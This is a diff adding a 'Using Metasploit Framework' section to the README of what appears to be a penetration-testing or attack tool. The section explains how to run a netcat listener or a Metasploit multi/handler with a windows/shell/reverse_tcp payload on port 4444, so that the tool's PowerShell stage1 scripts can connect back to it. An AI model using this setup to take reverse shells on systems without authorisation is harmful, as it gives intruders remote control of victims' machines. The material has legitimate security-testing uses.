@@ -147,3 +147,26 @@ likely due to naive implementation!) limit us even further! Currently, we are
 achieving approximately 4KBps.
 
 Patches to improve the speed (and any other aspect of the system) are welcome!
+
+Using Metasploit Framework
+==========================
+
+The current attack.sh script expects to connect to a listener running on port 4444
+on localhost. Exactly what sort of listener that should be depends on the stage1
+script that was sent. If you send spawn.ps1, the listener can be a simple
+"nc -l -p 4444". If you are sending msf_proxy.ps1, the listener should be an
+appropriately configured msfconsole. You can choose your payload as you like,
+from the group of payloads that make use of a staged/reverse_tcp connection.
+
+For example:
+```
+./msfconsole
+use exploit/multi/handler
+set payload windows/shell/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 4444
+exploit
+```
+
+NB: Do NOT set LHOST to 127.0.0.1, this is an internal "magic number" used by
+metasploit for its own purposes. Things randomly break if you do!
